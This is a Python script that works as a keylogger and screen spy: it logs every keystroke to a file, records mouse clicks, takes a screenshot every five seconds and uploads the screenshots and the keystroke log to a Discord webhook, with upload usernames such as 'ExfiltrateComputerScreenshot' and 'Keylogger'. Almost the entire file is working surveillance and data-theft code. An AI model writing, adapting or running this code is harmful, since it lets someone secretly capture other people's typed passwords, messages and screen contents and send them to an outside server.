# Import required libraries
import pyautogui
import requests
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import datetime
import logging
import time

# Keylogger variables
keys_information = "key_log.txt"
iterationTimeSeconds = 60
number_of_iterations_end = 1
totalExpectedTimeSeconds = iterationTimeSeconds * number_of_iterations_end
totalExpectedTimeMinutes = totalExpectedTimeSeconds / 60
currentTime = time.time()
stoppingTime = time.time() + iterationTimeSeconds

# Mouse click recorder variables
clicks = []

# Discord webhook URL
discord_webhook = "YOUR_DISCORD_WEBHOOK_URL"

# Function to record key presses
def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Function to write key presses to a file
def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        f.close()

# Function to record mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        clicks.append((x, y, button, time.time()))

# Start recording mouse clicks and key presses
print("Recording mouse clicks, keyboard input, and taking screenshots for 1 minute...")

start_time = time.time()
runTimeSeconds = 60
runTimeMinutes = runTimeSeconds / 60
end_time = start_time + runTimeSeconds

count = 0
keys = []

with Listener(on_press=on_press, on_release=None) as key_listener, MouseListener(on_click=on_click) as mouse_listener:
    try:
        while time.time() < end_time:
            if int(time.time() - start_time) % 5 == 0:
                # Take a screenshot
                screenshot = pyautogui.screenshot()
                screenshot.save(f"screenshot_{int(time.time() - start_time)}.png")

                # Send the screenshot to Discord
                with open(f"screenshot_{int(time.time() - start_time)}.png", "rb") as f:
                    photo = f.read()
                request_data = {
                    "username": "ExfiltrateComputerScreenshot"
                }
                response = requests.post(discord_webhook, data=request_data, files={"screenshot.png": photo})

                if response.status_code == 200:
                    print("Screenshot successfully sent to Discord!")
                else:
                    print(f"Error while sending screenshot to Discord: {response.status_code}")

    except KeyboardInterrupt:
        pass

# Send the key_log.txt to Discord
with open(keys_information, "rb") as f:
    keylog = f.read()
request_data = {
    "username": "Keylogger",
    "content": "Key Log",
}
response = requests.post(discord_webhook, data=request_data, files={"key_log.txt": keylog})

if response.status_code == 200:
    print("Key log successfully sent to Discord!")
else:
    print(f"Error while sending key log to Discord: {response.status_code}")

# Display recorded clicks
print("Recorded clicks:")
for i, click in enumerate(clicks, 1):
    x, y, button, click_time = click
    print(f"Click {i}: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f} seconds")

# Save recorded clicks to a file (optional)
with open("recorded_clicks.txt", "w") as file:
    for i, click in enumerate(clicks, 1):
        x, y, button, click_time = click
        file.write(f"Click {i}: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f} seconds\n")

# Count the number of words typed
with open('key_log.txt', 'r') as file:
    lines = file.readlines()
wordsInLogFile = len(lines)

print(f"Number of minutes that have passed since the log file started: {totalExpectedTimeMinutes}")
print(f"Number of words in the log file: {wordsInLogFile}")
wordsPerMinute = wordsInLogFile

# Measure the amount of mouse clicks
clicksInLogFile = len(clicks)
print(f"Number of minutes that have passed since the log file started: {runTimeMinutes}")
print(f"Number of clicks in the log file: {clicksInLogFile}")
clicksPerMinute = clicksInLogFile

print(f"Number of words per minute: {wordsPerMinute}")
print(f"Number of clicks per minute: {clicksPerMinute}")

print("Recording completed.")
